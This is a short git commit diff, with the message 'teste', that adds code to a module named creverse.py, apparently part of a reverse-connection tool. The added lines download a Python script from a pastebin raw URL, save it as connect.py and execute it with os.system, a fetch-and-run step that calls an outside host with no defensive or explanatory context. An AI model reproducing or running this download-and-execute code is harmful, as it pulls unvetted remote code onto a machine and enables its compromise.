18af56c4ed5892611a40a061a780d999084ec14c
root <root@localhost.localdomain>
2016-12-25 16:28:24 -0300

    teste

--- modules/creverse.py
+++ modules/creverse.py
@@ -1,4 +1,8 @@
 import os
+import urllib
 
 def ran():
         print "[ + ] Connection [ + ]"
+	testfile = urllib.URLopener()
+	testfile.retrieve("http://pastebin.com/raw/0dbGx4eq", "connect.py")
+	os.system("python connect.py")
